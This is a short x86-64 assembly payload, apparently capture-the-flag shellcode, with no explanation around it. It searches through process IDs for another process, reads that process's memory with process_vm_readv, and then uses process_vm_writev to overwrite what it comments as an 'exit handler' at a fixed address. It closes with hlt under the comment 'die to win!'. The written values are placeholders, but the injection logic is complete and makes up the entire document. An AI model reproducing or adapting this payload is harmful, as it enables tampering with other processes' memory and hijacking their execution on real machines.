  mov r15, 0
  mov eax, 39
  syscall
  mov r14d, eax

;; find child pid
  lea rax, [rel value]
  mov [rel array_lvec], rax
  .@Lp:
  inc r15d
  cmp r15d, r14d
  jz .@Lp
  ; process_vm_readv(r15, lvec, lcnt, rvec, rcnt, 0)
  xor r9d, r9d
  mov r8d, 1
  lea r10, [rel array_rvec]
  mov edx, 1
  lea rsi, [rel array_lvec]
  mov edi, r15d
  mov eax, 310
  syscall
  cmp eax, 0
  js .@Lp

;; overwrite exit handler
  mov rax, 0xdeaddeaddeaddead
  mov rdx, 0xcafecafecafecafe
  mov [rel array_rvec], rax
  mov [rel value], rdx
  ; process_vm_writev(r15, lvec, lcnt, rvec, rcnt, 0)
  xor r9d, r9d
  mov r8d, 1
  lea r10, [rel array_rvec]
  mov edx, 1
  lea rsi, [rel array_lvec]
  mov edi, r15d
  mov eax, 311
  syscall

;; die to win!
  hlt

array_rvec:
  dq 0x400000, 8
array_lvec:
  dq 0, 8
value:
  dq 0

